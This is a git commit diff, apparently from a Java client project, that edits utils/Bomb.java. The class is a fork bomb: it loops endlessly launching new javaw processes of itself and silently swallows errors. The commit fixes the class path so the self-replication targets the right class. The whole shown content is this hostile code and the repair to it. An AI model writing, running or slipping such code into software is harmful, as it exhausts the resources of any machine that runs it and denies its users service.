f01e509d12e20395baeae0b1bcf4bc44a3c7f03a
Coppini <hozerboy2239@gmail.com>
2019-02-03 12:29:59 -0200

    arruma path do bomb

--- client/src/main/java/utils/Bomb.java
+++ client/src/main/java/utils/Bomb.java
@@ -6,7 +6,7 @@ public class Bomb {
     public static void main(String[] args) {
         try {
             while (true)
-                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "main.utils.Bomb"});
+                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), Bomb.class.toString()});
         } catch (IOException e) {
             // silence is golden
         }
